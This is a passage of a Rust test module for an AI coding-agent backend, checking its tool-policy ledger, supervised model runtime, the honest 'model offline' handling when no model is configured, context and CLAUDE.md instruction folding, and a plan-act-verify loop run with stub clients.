        assert!(run_rec.effects.contains(&"Process".to_string()));
        assert_eq!(run_rec.decision, PolicyDecision::RequireSandbox);
        let read_rec = ledger.iter().find(|r| r.tool == "fs.read").unwrap();
        assert_eq!(read_rec.effects, vec!["Read".to_string()]);
        assert_eq!(read_rec.decision, PolicyDecision::Allow);
        let commit_rec = ledger.iter().find(|r| r.tool == "git.commit").unwrap();
        assert_eq!(commit_rec.effects, vec!["GitMutation".to_string()]);

        // The ledger is ADDITIVE: a `policy.decision` event kind was appended for
        // each evaluation (durable, session-scoped).
        let events = host
            .services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await
            .unwrap();
        assert_eq!(
            events
                .iter()
                .filter(|event| event.kind == "policy.decision")
                .count(),
            4
        );

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn write_policy_follows_engine_decision() {
        // With the workspace-write policy set to Allow, the derived decision for a
        // write tool is the engine's Allow (proving the engine is consulted, not a
        // fixed answer).
        let dir = std::env::temp_dir().join(format!("hide_policy_write_{}", now_ms()));
        let mut config = HideConfig::for_workspace(&dir);
        config.security.workspace_write_default = Decision::Allow;
        let host = BackendHost::from_services(BackendServices::open(config).unwrap()).unwrap();
        let session = host.services.session();

        let decision = host
            .evaluate_tool_policy(
                &session,
                "edit.write_file",
                &json!({ "path": dir.join("c.txt").to_string_lossy(), "content": "x" }),
            )
            .await
            .unwrap();
        assert_eq!(decision, PolicyDecision::Allow);

        let ledger = host.policy_decisions(&session).await.unwrap();
        assert_eq!(ledger.len(), 1);
        assert_eq!(ledger[0].tool, "edit.write_file");
        assert_eq!(ledger[0].decision, PolicyDecision::Allow);
        assert_eq!(ledger[0].effects, vec!["Write".to_string()]);

        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn host_reports_status_surface() {
        let dir = std::env::temp_dir().join(format!("hide_host_status_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let status = host.status().await;
        assert!(status.capabilities.agent_kernel);
        assert!(status.tools.iter().any(|tool| tool.name == "fs.write"));
        assert!(status
            .connectors
            .iter()
            .any(|connector| connector.id == "research"));
        assert!(status
            .model_roles
            .iter()
            .any(|role| role.name == "hawking-hero-coder"));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn host_records_run_command_intent_and_executes_command_api() {
        let dir = std::env::temp_dir().join(format!("hide_host_command_{}", now_ms()));
        let mut config = HideConfig::for_workspace(&dir);
        config.security.shell_default = Decision::Allow;
        let host = BackendHost::from_services(BackendServices::open(config).unwrap()).unwrap();

        let ack = host
            .handle_intent(Intent::RunCommand {
                argv: vec!["printf".to_string(), "intent".to_string()],
                cwd: None,
            })
            .await
            .unwrap();
        assert!(ack.accepted);

        let session_id = host.services.session();
        let result = host
            .run_command(
                session_id,
                vec!["printf".to_string(), "api".to_string()],
                None,
            )
            .await
            .unwrap();

        assert_eq!(result.status, ToolStatus::Ok);
        assert_eq!(result.structured_content.unwrap()["stdout"], "api");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn host_routes_connector_calls() {
        let dir = std::env::temp_dir().join(format!("hide_host_connector_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let mut run = ResearchRun::new("host connector");
        run.state = ResearchState::Complete;

        host.call_connector("research", "runs.append", json!({ "run": run }))
            .await
            .unwrap();
        let listed = host
            .call_connector("research", "runs.list", json!({ "limit": 1 }))
            .await
            .unwrap();

        assert_eq!(listed["runs"].as_array().unwrap().len(), 1);
        assert_eq!(listed["runs"][0]["topic"], "host connector");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn host_reports_health_checks() {
        let dir = std::env::temp_dir().join(format!("hide_host_health_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let health = host.health().await;

        assert_eq!(health.status, HealthStatus::Ok);
        assert!(health.checks.iter().any(|check| check.name == "tools"));
        assert!(health
            .checks
            .iter()
            .any(|check| check.name == "connector:personalization"));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn host_caps_are_honest_remote_is_false() {
        let dir = std::env::temp_dir().join(format!("hide_host_caps_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let caps = host.status().await.capabilities;
        // Everything wired is true; the un-wired remote protocol is false.
        assert!(caps.agent_kernel && caps.fleet && caps.model_orchestration);
        assert!(!caps.remote_protocol);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn host_fleet_run_schedules_and_completes() {
        let dir = std::env::temp_dir().join(format!("hide_host_fleet_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();
        // Schedule a parallel kernel run via FleetManager; the minimal stub
        // kernel drives to Done. The previously-dead hide-fleet dep is now live.
        let status = host.fleet_run(session, "scaffold a module").await.unwrap();
        assert_eq!(status, "Done");
        let _ = std::fs::remove_dir_all(dir);
    }

    /// THE FLAGSHIP integration test (WP-11). Proves the whole host loop:
    ///
    /// 1. Boot the [`RuntimeSupervisor`] against a FAKE in-process serve (health
    ///    + generate/embed stub) → state machine reaches `Ready`.
    /// 2. Drive an `Intent` through [`CommandRouter`] - it is *validated* and
    ///    accepted (a blank one would be rejected).
    /// 3. Generate through the kernel's runtime-client seam, backed by the HTTP
    ///    `ModelProvider` pointed at the supervised fake serve.
    /// 4. Assert the completion is published as a `UiEvent` on the broadcast bus
    ///    (the real Wire-B), with the text the fake runtime returned.
    ///
    /// This is the end-to-end path the audit said never closed: "the runtime is
    /// never booted; nothing flows end-to-end." It now flows.
    #[tokio::test]
    async fn flagship_boot_supervise_intent_generate_publish() {
        use crate::supervisor::testkit::{FakeLauncher, FakeRuntime};
        use crate::supervisor::{RuntimeSupervisor, SupervisorConfig};
        use hide_core::supervision::{BackoffPolicy, ProcessSpec};
        use std::time::Duration;

        let dir = std::env::temp_dir().join(format!("hide_flagship_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();

        // (1) Boot the supervisor against the fake serve.
        let rt = Arc::new(FakeRuntime::spawn().await);
        let cfg = SupervisorConfig {
            spec: ProcessSpec {
                name: "fake-serve".to_string(),
                argv: vec!["fake".to_string()],
                cwd: None,
                env: Default::default(),
                health_url: None,
            },
            backoff: BackoffPolicy::default(),
            health_interval: Duration::from_millis(10),
            boot_timeout: Duration::from_secs(2),
            lock_path: Some(host.services.layout().hide_dir.join("runtime.lock")),
        };
        let supervisor = RuntimeSupervisor::new(cfg, Arc::new(FakeLauncher::new(rt.clone())));
        supervisor.boot().await.unwrap();
        assert_eq!(
            supervisor.state(),
            hide_core::runtime::RuntimeSupervisorState::Ready
        );
        let base_url = supervisor.base_url().unwrap();

        // (2) Drive a validated intent through the command router.
        let session = host.services.session();
        let ack = host
            .handle_intent(Intent::SubmitTurn {
                session_id: session.clone(),
                text: "implement the parser".to_string(),
                attachments: Vec::new(),
            })
            .await
            .unwrap();
        assert!(ack.accepted, "valid SubmitTurn must be accepted");

        // (3+4) Subscribe to Wire-B, then generate against the supervised runtime
        // through the kernel runtime-client + HTTP ModelProvider, and assert the
        // completion is published on the broadcast bus.
        let mut rx = host.subscribe_ui();
        let completion = host
            .generate_and_publish(session.clone(), &base_url, "write a function")
            .await
            .unwrap();
        assert_eq!(completion, "fake generate");

        // The coalesced TokenBatch lands on the broadcast channel.
        let event = tokio::time::timeout(Duration::from_secs(2), rx.recv())
            .await
            .expect("a UiEvent should be published")
            .expect("broadcast channel delivers");
        match event.kind {
            UiEventKind::TokenBatch { text, .. } => assert_eq!(text, "fake generate"),
            other => panic!("expected a TokenBatch UiEvent, got {other:?}"),
        }

        supervisor.shutdown().await;
        rt.stop();
        let _ = std::fs::remove_dir_all(dir);
    }

    /// No model configured (`HIDE_MODEL_WEIGHTS` unset, the headless default):
    /// an ACCEPTED `SubmitTurn` must NOT fabricate a token. It surfaces a
    /// `RuntimeStatus` "model offline" UiEvent on Wire-B instead, never a fake
    /// `TokenBatch`. This guards the "no silent failure / never a fake token"
    /// contract.
    #[tokio::test]
    async fn submit_turn_with_no_runtime_publishes_model_offline_not_a_token() {
        let dir = std::env::temp_dir().join(format!("hide_host_offline_{}", now_ms()));
        // Ensure the gate is OFF for this test regardless of ambient env.
        std::env::remove_var("HIDE_MODEL_WEIGHTS");
        let host = BackendHost::open_workspace(&dir).unwrap();
        assert!(
            host.runtime_state().is_none(),
            "no runtime should be configured without HIDE_MODEL_WEIGHTS"
        );

        let session = host.services.session();
        let mut rx = host.subscribe_ui();
        let ack = host
            .handle_intent(Intent::SubmitTurn {
                session_id: session.clone(),
                text: "implement the parser".to_string(),
                attachments: Vec::new(),
            })
            .await
            .unwrap();
        // The ack is still accepted + synchronous (the contract is unchanged).
        assert!(ack.accepted);

        let event = tokio::time::timeout(std::time::Duration::from_secs(2), rx.recv())
            .await
            .expect("a UiEvent should be published")
            .expect("broadcast delivers");
        match event.kind {
            UiEventKind::RuntimeStatus { status, detail } => {
                assert_eq!(status, "down");
                assert!(
                    detail.unwrap_or_default().contains("no model configured"),
                    "offline notice should name the missing model"
                );
            }
            UiEventKind::TokenBatch { .. } => {
                panic!("must not fabricate a token when no model is online")
            }
            other => panic!("expected a RuntimeStatus UiEvent, got {other:?}"),
        }
        let _ = std::fs::remove_dir_all(dir);
    }

    /// Phase-1b Increment 1 (defects S2 + S3): `run_turn_core` must feed a REAL
    /// compiled context and a REAL derived budget into the request - not the old
    /// raw-prompt / `messages: Vec::new()` / hard-`256` facade - and persist the
    /// turn so the next one has history. Driven headlessly with a recording stub
    /// client: no model, no HTTP.
    #[tokio::test]
    async fn run_turn_core_feeds_compiled_context_real_budget_and_persists_turn() {
        use futures::future::BoxFuture;
        use hawking_index::InMemoryCodeIndex;
        use hawking_orch::inference::{InferenceClient, StubInferenceClient};
        use hide_core::error::Result as HResult;
        use hide_core::runtime::{GenerationStats, InferenceRequest, TokenSink};

        // A test-only client that records the last request it is asked to generate,
        // then delegates to the deterministic stub.
        struct RecordingClient {
            inner: StubInferenceClient,
            last: std::sync::Mutex<Option<InferenceRequest>>,
        }
        impl InferenceClient for RecordingClient {
            fn generate<'a>(
                &'a self,
                request: InferenceRequest,
                sink: TokenSink<'a>,
            ) -> BoxFuture<'a, HResult<GenerationStats>> {
                *self.last.lock().unwrap() = Some(request.clone());
                self.inner.generate(request, sink)
            }
            fn embed<'a>(&'a self, text: &'a str) -> BoxFuture<'a, HResult<Vec<f32>>> {
                self.inner.embed(text)
            }
        }

        let dir = std::env::temp_dir().join(format!("hide_turn_core_{}", now_ms()));
        let services = BackendServices::open(HideConfig::for_workspace(&dir)).unwrap();
        let session = services.session();

        // Seed the code index with a distinctive marker on a CONTENT line so the
        // lexical retrieval leg pulls it (as a snippet) into the compiled prompt.
        let index = Arc::new(InMemoryCodeIndex::default());
        index.add_text_file(
            "src/seed.rs",
            "// zzcontextmarker anchor line for retrieval\npub fn helper() {}\n",
            None,
        );

        let recorder = Arc::new(RecordingClient {
            inner: StubInferenceClient::new("some completion"),
            last: std::sync::Mutex::new(None),
        });
        let inference: Arc<dyn InferenceClient> = recorder.clone();
        let ui_bus = Arc::new(UiEventBus::default());

        let outcome = run_turn_core(
            inference,
            services.event_log.clone(),
            services.role_registry.clone(),
            index.clone(),
            services.memory_store.clone(),
            ui_bus,
            session.clone(),
            "zzcontextmarker".to_string(),
            None,
            None,
            services.repo_instructions.clone(),
        )
        .await
        .unwrap();

        // The stub's completion is returned verbatim.
        assert_eq!(outcome.completion, "some completion");

        // (S3) The compiled context (the seeded marker) rode into the request prompt.
        let req = recorder
            .last
            .lock()
            .unwrap()
            .clone()
            .expect("a request was recorded");
        assert!(
            req.prompt.contains("zzcontextmarker"),
            "compiled context must be folded into the prompt, got: {}",
            req.prompt
        );
        // The current user prompt is also carried in `messages` (future Chat route).
        assert!(req
            .messages
            .iter()
            .any(|m| m.role == "user" && m.content == "zzcontextmarker"));
        // (S2) The output budget is DERIVED from the window, not the old fixed 256.
        assert_ne!(
            req.max_output_tokens, 256,
            "budget must be derived, not the 256 facade"
        );

        // (S2/S3) Both durable markers were appended: the compile record, and the
        // assistant turn (so the NEXT turn's history sees this one).
        let events = services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await
            .unwrap();
        assert!(
            events.iter().any(|e| e.kind == "context.compiled"),
            "a context.compiled event must be logged"
        );
        assert!(
            events.iter().any(|e| e.kind == "agent.message"
                && e.payload["role"] == "assistant"
                && e.payload["text"] == "some completion"),
            "an assistant agent.message must be logged"
        );

        let _ = std::fs::remove_dir_all(dir);
    }

    /// Bible sec 20 / sec 78.1 #11: a repo's `CLAUDE.md` (Claude Code migration
    /// config) must be resolved at workspace open, cached on the services, and
    /// FOLDED into the compiled turn context by `run_turn_core` - with a
    /// `context.instructions` receipt logged. Driven headlessly with a recording
    /// stub client (no model, no HTTP).
    #[tokio::test]
    async fn repo_claude_md_folds_into_turn_context_with_receipt() {
        use futures::future::BoxFuture;
        use hawking_index::InMemoryCodeIndex;
        use hawking_orch::inference::{InferenceClient, StubInferenceClient};
        use hide_core::error::Result as HResult;
        use hide_core::runtime::{GenerationStats, InferenceRequest, TokenSink};

        struct RecordingClient {
            inner: StubInferenceClient,
            last: std::sync::Mutex<Option<InferenceRequest>>,
        }
        impl InferenceClient for RecordingClient {
            fn generate<'a>(
                &'a self,
                request: InferenceRequest,
                sink: TokenSink<'a>,
            ) -> BoxFuture<'a, HResult<GenerationStats>> {
                *self.last.lock().unwrap() = Some(request.clone());
                self.inner.generate(request, sink)
            }
            fn embed<'a>(&'a self, text: &'a str) -> BoxFuture<'a, HResult<Vec<f32>>> {
                self.inner.embed(text)
            }
        }

        let dir = std::env::temp_dir().join(format!("hide_turn_compat_{}", now_ms()));
        std::fs::create_dir_all(&dir).unwrap();
        // A migrated repo's root CLAUDE.md carrying a distinctive house rule.
        std::fs::write(
            dir.join("CLAUDE.md"),
            "# House rules\nZZHOUSERULETOKEN: never delete data without confirmation.\n",
        )
        .unwrap();

        // `open` resolves the CLAUDE.md tree once and caches it on the services.
        let services = BackendServices::open(HideConfig::for_workspace(&dir)).unwrap();
        assert!(
            !services.repo_instructions.is_empty(),
            "open() must resolve + cache the repo CLAUDE.md instructions"
        );
        assert!(
            services.repo_instructions.text.contains("ZZHOUSERULETOKEN"),
            "cached instructions must carry the CLAUDE.md rule"
        );
        let session = services.session();

        let index = Arc::new(InMemoryCodeIndex::default());
        let recorder = Arc::new(RecordingClient {
            inner: StubInferenceClient::new("ok"),
            last: std::sync::Mutex::new(None),
        });
        let inference: Arc<dyn InferenceClient> = recorder.clone();

        run_turn_core(
            inference,
            services.event_log.clone(),
            services.role_registry.clone(),
            index.clone(),
            services.memory_store.clone(),
            Arc::new(UiEventBus::default()),
            session.clone(),
            "some unrelated task".to_string(),
            None,
            None,
            services.repo_instructions.clone(),
        )
        .await
        .unwrap();

        // The CLAUDE.md house rule rode into the request prompt (folded context).
        let req = recorder
            .last
            .lock()
            .unwrap()
            .clone()
            .expect("a request was recorded");
        assert!(
            req.prompt.contains("ZZHOUSERULETOKEN"),
            "the repo CLAUDE.md instruction must fold into the compiled prompt, got: {}",
            req.prompt
        );

        // The context receipt is logged: which instruction files loaded.
        let events = services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await
            .unwrap();
        let receipt = events
            .iter()
            .find(|e| e.kind == "context.instructions")
            .expect("a context.instructions receipt must be logged");
        assert!(
            receipt.payload["count"].as_u64().unwrap_or(0) >= 1,
            "receipt must name at least one loaded file, got: {}",
            receipt.payload
        );
        assert!(
            receipt.payload["files"]
                .as_array()
                .map(|a| a.iter().any(|f| f["path"]
                    .as_str()
                    .map(|p| p.ends_with("CLAUDE.md"))
                    .unwrap_or(false)))
                .unwrap_or(false),
            "receipt files must list the CLAUDE.md, got: {}",
            receipt.payload
        );

        let _ = std::fs::remove_dir_all(dir);
    }

    /// Phase-1b Increment 2 (defect S1): a live `SubmitTurn` must route through
    /// the REAL kernel loop - plan, act, verify with deterministic oracles - not
    /// the stub kernel. Modeled on `hide-kernel/tests/full_run.rs`: a tiny real
    /// git repo, a scripted [`StubInferenceClient`] (no live model / no HTTP), and
    /// no-op Pass oracles so the loop terminates deterministically. Drives the
    /// SAME production `run_turn_kernel` path used by the live host, asserting the
    /// FSM reaches a terminal phase and the driver persisted the canonical loop
    /// events (`plan.created` + `agent.observation` + `verify.result`), and that
    /// the compiled ContextPack rode into the run objective.
    #[tokio::test]
    async fn run_turn_kernel_drives_real_loop_to_terminal_with_compiled_context() {
        use futures::future::BoxFuture;
        use hawking_orch::inference::StubInferenceClient;
        use hawking_orch::router::SimpleRouter;
        use hide_core::config::HideConfig;
        use hide_core::ids::now_ms;
        use hide_kernel::govern::Autonomy;
        use hide_kernel::runtime_client::KernelRuntimeClient;
        use hide_kernel::verify::oracle::{Oracle, OracleClass, Verdict, VerificationInput};
        use hide_kernel::verify::OracleSuite;
        use hide_kernel::{AgentKernel, Grounding};

        // A no-op always-Pass deterministic oracle so the gate accepts without
        // shelling `cargo`/`git` in the temp repo (the doc-sanctioned substitute
        // for awkward real oracles). Registered under the ids the default plan
        // declares (`build`/`test`).
        struct NoopPassOracle(&'static str);
        impl Oracle for NoopPassOracle {
            fn name(&self) -> &str {
                self.0
            }
            fn verify<'a>(
                &'a self,
                _input: &'a VerificationInput,
            ) -> BoxFuture<'a, Result<Verdict>> {
                Box::pin(async move {
                    Ok(Verdict::pass(self.0, OracleClass::Deterministic, "noop pass"))
                })
            }
        }

        // A tiny REAL git repo with a couple of files (a realistic workspace root).
        let dir = std::env::temp_dir().join(format!("hide_kernel_turn_{}", now_ms()));
        std::fs::create_dir_all(dir.join("src")).unwrap();
        std::fs::write(dir.join("Cargo.toml"), "[package]\nname=\"fx\"\n").unwrap();
        std::fs::write(dir.join("src/lib.rs"), "pub fn add(a: i32, b: i32) -> i32 { a + b }\n")
            .unwrap();
        let _ = std::process::Command::new("git")
            .args(["init", "-q"])
            .current_dir(&dir)
            .output();

        let services = Arc::new(BackendServices::open(HideConfig::for_workspace(&dir)).unwrap());
        let session = services.session();

        // Seed the code index with a line whose text the prompt is a substring of
        // (the in-memory lexical leg matches the whole query against a line), and
        // put a token - `ZZONLYINFILE` - that appears ONLY in the seeded file, so
        // finding it in the objective proves the compiled snippet (not the raw
        // prompt) was folded in.
        services.code_index.add_text_file(
            "src/marker.rs",
            "// zzkernelmarker context bridge anchor ZZONLYINFILE\npub fn helper() {}\n",
            None,
        );

        // Stub runtime (no HTTP): the auto-installed `RuntimePlanner` asks the
        // model for a step list; a single line yields ONE non-effectful `Verify`
        // step whose acceptance declares the `build`+`test` oracles.
        let runtime = Arc::new(KernelRuntimeClient::new(
            Arc::new(SimpleRouter::new(services.role_registry.clone())),
            Arc::new(StubInferenceClient::new("investigate and verify the change")),
        ));

        // The REAL permission-engine dispatcher (as `build_turn_kernel` builds) +
        // grounding, but with no-op oracles for a deterministic verdict.
        let dispatcher = Arc::new(build_default_tool_dispatcher(
            &services.config,
            Arc::new(build_default_tool_registry()),
        ));
        let mut suite = OracleSuite::new();
        suite.register(Arc::new(NoopPassOracle("build")));
        suite.register(Arc::new(NoopPassOracle("test")));
        suite.register(Arc::new(NoopPassOracle("typecheck")));
        let grounding = Arc::new(Grounding::new(
            services.code_index.clone() as Arc<dyn hawking_index::CodeIndex>
        ));
        let kernel = AgentKernel::builder(services.event_log.clone())
            .workspace_root(dir.to_string_lossy().to_string())
            .autonomy(Autonomy::SuggestOnly) // bounded; the plan step is non-effectful
            .grounding(grounding)
            .runtime(runtime)
            .dispatcher(dispatcher.clone())
            .oracle_suite(suite)
            .build();

        let ui_bus = Arc::new(UiEventBus::default());
        let interrupts = Arc::new(InterruptHub::default());
        let approvals = Arc::new(crate::approval::ApprovalHub::default());
        let run_id = RunId::new();

        // Drive the production path with a marker-bearing prompt and an
        // unreachable base_url (the live-manifest publish is best-effort → None).
        let state = run_turn_kernel(
            kernel,
            services.event_log.clone(),
            services.key_value_store.clone(),
            services.role_registry.clone(),
            services.code_index.clone(),
            services.memory_store.clone(),
            ui_bus,
            interrupts,
            approvals,
            run_id,
            session.clone(),
            "http://127.0.0.1:9/unreachable".to_string(),
            "zzkernelmarker context bridge anchor".to_string(),
            64,
            services.repo_instructions.clone(),
        )
        .await
        .unwrap();

        // (a) The run reached a terminal phase (Done for the passing oracles).
        assert!(
            state.phase.is_terminal(),
            "kernel run must reach a terminal phase, got {:?}",
            state.phase
        );

        // (b) The driver persisted the canonical loop events.
        let events = services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await
            .unwrap();
        let plan_created = events.iter().find(|e| {
            e.kind == "plan.created"
                && e.payload.get("action").and_then(|a| a.as_str()) == Some("created")
        });
        assert!(
            plan_created.is_some(),
            "a plan.created (action=created) event must be logged"
        );
        assert!(
            events.iter().any(|e| e.kind == "agent.observation"),
            "at least one agent.observation must be logged"
        );
        assert!(
            events.iter().any(|e| e.kind == "verify.result"),
            "at least one verify.result must be logged"
        );

        // (c) The compiled context rode into the run objective. `ZZONLYINFILE`
        // exists ONLY in the seeded file (never in the prompt), so its presence in
        // the plan objective proves the compiled ContextPack - not merely the raw
        // prompt - was folded into the objective the driver planned against.
        let objective = plan_created
            .unwrap()
            .payload
            .get("plan")
            .and_then(|p| p.get("objective"))
            .and_then(|o| o.as_str())
            .unwrap_or_default();
        assert!(
            objective.contains("zzkernelmarker"),
            "the plan objective must reference the compiled context marker, got: {objective}"
        );
        assert!(
            objective.contains("ZZONLYINFILE"),
            "the compiled ContextPack (retrieved snippet, file-only token) must ride into \
             the run objective, got: {objective}"
        );

        let _ = std::fs::remove_dir_all(dir);
    }

    // ---- F2 (answer surfacing) + F3/F4 (history in/out) on the kernel turn ----
    //
    // The kernel path now mirrors `run_turn_core`'s two shipping-critical bits:
    // it publishes a VISIBLE assistant answer on Wire-B (F2), threads prior turns
    // in via `rebuild_history` (F3), and persists its own assistant message out so
    // the next turn sees it (F4). Driven headlessly (no live model / no HTTP).

    /// A planner emitting ONE non-effectful `Synthesize` step (so no approval
    /// pause) gated by a single declared oracle, so a `StubInferenceClient` runtime
    /// produces a `generated` observation and a passing verdict carries the run to
    /// `Done`. The `generated` text becomes the turn's surfaced answer.
    struct AnswerPlanner {
        oracle: String,
    }
    impl hide_kernel::plan::planner::Planner for AnswerPlanner {
        fn synthesize<'a>(
            &'a self,
            objective: &'a str,
        ) -> futures::future::BoxFuture<'a, Result<hide_kernel::plan::schema::Plan>> {
            use hide_kernel::plan::schema::{Acceptance, Plan, PlanStatus, PlanStep, StepKind};
            let oracle = self.oracle.clone();
            let objective = objective.to_string();
            Box::pin(async move {
                let step = PlanStep::new(
                    "synthesize the answer",
                    StepKind::Synthesize,
                    Acceptance::with_oracles("an answer is produced", vec![oracle]),
                );
                Ok(Plan {
                    id: hide_core::ids::PlanId::new(),
                    title: "answer plan".to_string(),
                    objective,
                    steps: vec![step],
                    status: PlanStatus::Active,
                    budget: Default::default(),
                })
            })
        }
    }

    /// Drive ONE kernel turn (production `run_turn_kernel`) over the given services
    /// + session with a `Synthesize` step whose model output is `answer`. Subscribes
    /// to the ui_bus BEFORE driving and drains it after, so the caller can assert on
    /// the published UiEvents. Returns the terminal state + the drained UiEvents.
    async fn drive_answer_turn(
        services: Arc<BackendServices>,
        session: SessionId,
        prompt: &str,
        answer: &str,
    ) -> (AgentState, Vec<UiEvent>) {
        use hawking_orch::inference::StubInferenceClient;
        use hawking_orch::router::SimpleRouter;
        use hide_kernel::plan::planner::Planner;
        use hide_kernel::runtime_client::KernelRuntimeClient;
        use hide_kernel::verify::OracleSuite;

        let root = services
            .config
            .workspace_root
            .to_string_lossy()
            .to_string();
        let runtime = Arc::new(KernelRuntimeClient::new(
            Arc::new(SimpleRouter::new(services.role_registry.clone())),
            Arc::new(StubInferenceClient::new(answer)),
        ));
        let planner = Arc::new(AnswerPlanner {
            oracle: "answered".to_string(),
        });
        let mut suite = OracleSuite::new();
        suite.register(Arc::new(NoopPassOracle("answered")));
        let kernel = AgentKernel::builder(services.event_log.clone())
            .workspace_root(root)
            .autonomy(Autonomy::SuggestOnly)
            .planner(planner as Arc<dyn Planner>)
            .runtime(runtime)
            .oracle_suite(suite)
            .build();

        let ui_bus = Arc::new(UiEventBus::default());
        let mut rx = ui_bus.subscribe();
        let interrupts = Arc::new(InterruptHub::default());
        let approvals = Arc::new(ApprovalHub::default());
        let run_id = RunId::new();

        let state = run_turn_kernel(
            kernel,
            services.event_log.clone(),
            services.key_value_store.clone(),
            services.role_registry.clone(),
            services.code_index.clone(),
            services.memory_store.clone(),
            ui_bus.clone(),
            interrupts,
            approvals,
            run_id,
            session.clone(),
            "http://127.0.0.1:9/unreachable".to_string(),
            prompt.to_string(),
            64,
            services.repo_instructions.clone(),
        )
        .await
        .unwrap();

        // Broadcast delivery is synchronous with publish; the publisher already ran.
        let mut ui_events = Vec::new();
        while let Ok(ev) = rx.try_recv() {
            ui_events.push(ev);
        }
        (state, ui_events)
    }

    /// F2: a kernel turn must publish a VISIBLE assistant answer (a `TokenBatch`)
    /// on the ui_bus - the gap that previously kept the path opt-in.
    #[tokio::test]
    async fn kernel_turn_publishes_visible_assistant_answer_on_ui_bus() {
        let dir = std::env::temp_dir().join(format!("hide_kernel_f2_{}", now_ms()));
        let services = Arc::new(BackendServices::open(HideConfig::for_workspace(&dir)).unwrap());
        let session = services.session();

        let (state, ui_events) =
            drive_answer_turn(services, session, "produce the answer", "ZZVISIBLEANSWER done").await;

        assert!(state.phase.is_terminal(), "turn must reach terminal");
        // A visible assistant answer rode Wire-B as a coalesced TokenBatch carrying
        // the model's produced text.
        let batch = ui_events.iter().find_map(|e| match &e.kind {
            UiEventKind::TokenBatch { text, .. } => Some(text.clone()),
            _ => None,
        });
        let batch = batch.expect("a TokenBatch (visible assistant answer) must be published");
        assert!(
            batch.contains("ZZVISIBLEANSWER"),
            "the surfaced answer must carry the run's produced text, got: {batch}"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    /// F2 fallback: a turn that produces NO model text (this harness stubs an empty
    /// answer) must still surface a non-empty synthesized completion summary,
    /// derived from the terminal phase + verdict - never nothing, never a model call.
    #[tokio::test]
    async fn kernel_turn_synthesizes_answer_when_no_model_text() {
        let dir = std::env::temp_dir().join(format!("hide_kernel_f2b_{}", now_ms()));
        let services = Arc::new(BackendServices::open(HideConfig::for_workspace(&dir)).unwrap());
        let session = services.session();

        // Empty model output => no `generated` text => the summary path fires.
        let (state, ui_events) = drive_answer_turn(services, session, "do it", "").await;

        assert_eq!(state.phase, Phase::Done, "turn must finish");
        let batch = ui_events
            .iter()
            .find_map(|e| match &e.kind {
                UiEventKind::TokenBatch { text, .. } => Some(text.clone()),
                _ => None,
            })
            .expect("a synthesized TokenBatch must still be published");
        assert!(
            !batch.trim().is_empty() && batch.contains("done"),
            "the synthesized summary must be a real, non-empty verdict line, got: {batch}"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    /// F3 + F4: after a first kernel turn persists its assistant message (F4), a
    /// SECOND turn on the same session must see it - both directly via
    /// `rebuild_history` and folded into the next run's planned objective (F3).
    #[tokio::test]
    async fn kernel_turn_persists_answer_and_next_turn_threads_history() {
        let dir = std::env::temp_dir().join(format!("hide_kernel_f34_{}", now_ms()));
        let services = Arc::new(BackendServices::open(HideConfig::for_workspace(&dir)).unwrap());
        let session = services.session();

        // Turn 1: produces a distinctive answer that F4 must persist.
        let (state1, _ui1) = drive_answer_turn(
            services.clone(),
            session.clone(),
            "first question",
            "ZZTURNONEANSWER complete",
        )
        .await;
        assert!(state1.phase.is_terminal());

        // F4: an assistant `agent.message` carrying the turn-1 answer was persisted.
        let events = services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await
            .unwrap();
        assert!(
            events.iter().any(|e| e.kind == "agent.message"
                && e.payload.get("role").and_then(|r| r.as_str()) == Some("assistant")
                && e.payload
                    .get("text")
                    .and_then(|t| t.as_str())
                    .map(|t| t.contains("ZZTURNONEANSWER"))
                    .unwrap_or(false)),
            "turn 1 must persist an assistant agent.message with its answer (F4)"
        );

        // F3 (direct): `rebuild_history` now surfaces the turn-1 assistant message.
        let history = rebuild_history(&services.event_log, &session).await.unwrap();
        assert!(
            history.iter().any(|m| m.role == "assistant"
                && m.content.contains("ZZTURNONEANSWER")),
            "the next turn's rebuild_history must include turn 1's assistant message (F3)"
        );

        // F3 (folded): drive turn 2 and prove the prior answer rode into the run
        // objective the driver planned against (plan.created payload).
        let events_before = services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await
            .unwrap()
            .len();
        let (state2, _ui2) = drive_answer_turn(
            services.clone(),
            session.clone(),
            "second question",
            "ZZTURNTWOANSWER complete",
        )
        .await;
        assert!(state2.phase.is_terminal());

        let events2 = services
            .event_log
            .scan(Some(session.clone()), None, None)
            .await
            .unwrap();
        let turn2_plan = events2
            .iter()
            .skip(events_before)
            .find(|e| e.kind == "plan.created")
            .expect("turn 2 must log a plan.created");
        let objective = turn2_plan
            .payload
            .get("plan")
            .and_then(|p| p.get("objective"))
            .and_then(|o| o.as_str())
            .unwrap_or_default();
        assert!(
            objective.contains("ZZTURNONEANSWER"),
            "turn 2's planned objective must carry the folded prior-turn answer, got: {objective}"
        );
        assert!(
            objective.contains("second question"),
            "turn 2's objective must also carry the current prompt, got: {objective}"
        );
        let _ = std::fs::remove_dir_all(dir);
    }

    // ---- security-gate hold / approve-and-run / deny ----

    #[test]
    fn gate_book_holds_releases_and_denies() {
        let book = GateBook::default();
        let cmd = |s: &str| s.split_whitespace().map(String::from).collect::<Vec<_>>();
        let held = |argv, cwd| PendingAction::Command { argv, cwd };
